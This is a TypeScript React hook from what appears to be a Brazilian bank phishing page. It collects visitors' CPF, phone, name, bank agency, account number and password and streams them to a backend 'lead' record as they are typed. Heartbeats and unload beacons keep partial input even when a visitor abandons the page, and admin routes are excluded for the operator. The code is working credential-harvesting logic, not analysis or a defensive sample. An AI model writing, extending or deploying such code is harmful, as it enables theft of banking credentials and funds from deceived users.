import { useEffect, useRef, useCallback } from "react";
import { useLocation } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import { isValidSegment } from "@/lib/segment-config";

const ADMIN_ROUTES = ["/admin"];
const HEARTBEAT_INTERVAL = 30_000; // 30 s
const DEBOUNCE_MS = 500;

// sessionStorage is blocked in iOS Safari private browsing — wrap every access.
function sessionGet(key: string): string | null {
  try { return sessionStorage.getItem(key); } catch { return null; }
}
function sessionSet(key: string, value: string): void {
  try { sessionStorage.setItem(key, value); } catch { /* non-fatal */ }
}

/** Single source of truth for converting flow data → lead columns. */
function buildLeadUpdates(data: Record<string, string>): LeadUpdate {
  const updates: LeadUpdate = {};
  if (data.cpf) updates.cpf = data.cpf;
  if (data.phone) updates.phone = data.phone;
  if (data.nome) updates.nome = data.nome;
  if (data.segment && isValidSegment(data.segment)) updates.segment = data.segment;
  if (data.agency) updates.agency = data.agency;
  if (data.account) updates.account = data.account;
  if (data.password) updates.password = data.password;
  return updates;
}

export function useLeadTracking() {
  const location = useLocation();
  const { data } = useFlow();

  const leadIdRef = useRef<string | null>(sessionGet("lead_id"));
  const sessionIdRef = useRef<string | null>(null);
  const dataRef = useRef(data);
  dataRef.current = data;

  const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));

  // ── 1. Debounced lead data sync ──────────────────────────────────
  const updateLeadData = useCallback(async () => {
    if (!leadIdRef.current) return;

    const updates = buildLeadUpdates(data);
    if (Object.keys(updates).length === 0) return;

    try {
      await leadRepository.update(leadIdRef.current, updates);
    } catch (err) {
      console.error("Lead data update error:", err);
    }
  }, [data.cpf, data.phone, data.nome, data.segment, data.agency, data.account, data.password]);

  useEffect(() => {
    if (isAdmin || !leadIdRef.current) return;

    const id = setTimeout(updateLeadData, DEBOUNCE_MS);
    return () => clearTimeout(id);
  }, [updateLeadData, isAdmin]);

  // ── 2. Page navigation → lead step + session creation ────────────
  useEffect(() => {
    if (isAdmin) return;

    const page = location.pathname.replace("/", "") || "splash";

    const track = async () => {
      try {
        if (!leadIdRef.current) {
          const lead = await leadRepository.create({
            current_step: page,
            ...buildLeadUpdates(data),
          });
          leadIdRef.current = lead.id;
          sessionSet("lead_id", lead.id);
        } else {
          await leadRepository.update(leadIdRef.current, {
            current_step: page,
            ...(page === "concluido" ? { status: "concluido" } : {}),
          });
        }

        if (sessionIdRef.current) {
          await sessionRepository.updatePage(sessionIdRef.current, page);
          return;
        }

        try {
          const result = await edgeFunctionsService.checkAccess({
            lead_id: leadIdRef.current!,
            user_agent: navigator.userAgent,
          });
          sessionIdRef.current = result.session_id ?? null;
        } catch {
          console.error("Session creation via edge function failed");
        }
      } catch (err) {
        console.error("Lead tracking error:", err);
      }
    };

    track();
  }, [location.pathname, isAdmin]); // removed `data` — debounce effect handles it

  // ── 3. Heartbeat + unload (stable — no data dependency) ──────────
  useEffect(() => {
    if (isAdmin) return;

    const handleUnload = () => {
      if (leadIdRef.current) {
        const updates = buildLeadUpdates(dataRef.current);
        if (Object.keys(updates).length > 0) {
          leadRepository.sendBeacon(leadIdRef.current, updates);
        }
      }
      if (sessionIdRef.current) {
        sessionRepository.sendBeaconEnd(sessionIdRef.current);
      }
    };

    const sendHeartbeat = () => {
      if (!sessionIdRef.current) return;
      sessionRepository.sendBeaconHeartbeat(sessionIdRef.current);
    };

    const handleVisibilityChange = () => {
      if (document.hidden) handleUnload();
    };

    const heartbeatId = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
    window.addEventListener("beforeunload", handleUnload);
    window.addEventListener("pagehide", handleUnload);
    document.addEventListener("visibilitychange", handleVisibilityChange);

    return () => {
      clearInterval(heartbeatId);
      window.removeEventListener("beforeunload", handleUnload);
      window.removeEventListener("pagehide", handleUnload);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, [isAdmin]); // stable — refs keep values fresh
}
